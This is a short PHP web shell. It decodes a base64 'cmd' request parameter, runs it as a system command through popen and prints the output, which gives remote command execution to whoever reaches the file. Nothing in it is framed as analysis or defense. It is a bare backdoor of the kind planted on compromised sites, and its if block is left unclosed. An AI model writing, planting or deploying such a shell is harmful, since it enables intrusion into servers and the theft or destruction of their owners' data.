<?php
function exe($s_c){
	$s_out = "";
	$s_c = $s_c." 2>&1";

	if(is_callable('popen')){
		$s_f = @popen($s_c, 'r');
		while(!feof($s_f)){
			$s_out .= fread($s_f, 2096);
		}
		pclose($s_f);
	}
	return $s_out;

}

if(isset($_REQUEST['cmd'])){
	$s_cmd = base64_decode($_REQUEST['cmd']);
	echo exe($s_cmd);
?>